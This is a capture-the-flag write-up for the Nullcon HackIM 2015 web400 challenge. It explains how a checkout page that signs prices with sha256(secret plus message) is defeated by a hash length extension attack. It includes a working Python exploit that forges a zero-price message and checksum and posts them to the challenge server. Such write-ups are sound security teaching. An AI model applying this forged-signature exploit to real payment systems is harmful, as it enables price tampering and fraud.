For me this challenge was quite easy.

The description we were given was this one:
```
Buy Nullcon Pass For Free. 
```
Then I opened [nullcon.html](http://54.165.191.231/nullcon.html) and got this page:

![web400 index](http://saxx.swordarmor.fr/CTF/HACKIM_web400_index.png "web400 index")

The purpose here is to buy a Pass for 0 rupee.

When we tried to buy it we got this error:

![web400 checkout](http://saxx.swordarmor.fr/CTF/HACKIM_web400_checkout.png "web400 checkout")

If we looked at the main source page, we see that "hint": 

```html
<!-- 
    if( $checksum === hash("sha256",$secretkey . $msg))   // secretkey is XXXXXXXXXXXXXXXXXXX    :-P
    {
      // Success; :)
    }
  ?> 
-->
```
This sounds to me like hash length extension attack.
<br>
You will find an incredible explanation of what [hash length extension attack is](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks) by visiting this article.

Here is my python exploit:

```python
#!/usr/bin/python

__author__ = '@_SaxX_'
__file__ = 'hashlength'

import hlextend, requests

url 				      = "http://54.165.191.231/checkout.php"
hashextender 		  = "/home/saxx/SECU/hash_extender/hash_extender"
defaultcookie 		= "Nullcon2015|corporate|10999"
defaulthashvalue 	= "568fe78b29ac377a58ae1fbf02b4d1a158e605b3897916227e4b3ecfc78973db"
newcookie2append 	= "|0"
theHash 			    = "sha256"
secretkeylen      = 19 #by bruteforcing
sha = hlextend.new(theHash)
data = sha.extend(newcookie2append, defaultcookie, secretkeylen, defaulthashvalue)
payload = { "msg": data.replace('\\x','%'), "checksum": sha.hexdigest() }
print requests.post(url, payload).text
```

And then the result of the execution:

![web400 flag](http://saxx.swordarmor.fr/CTF/HACKIM_web400_flag.png "web400 flag")

Hence, the flag was **flag{fl@g_*2o15}}** to score easily 400 more points.

Enjoy :)
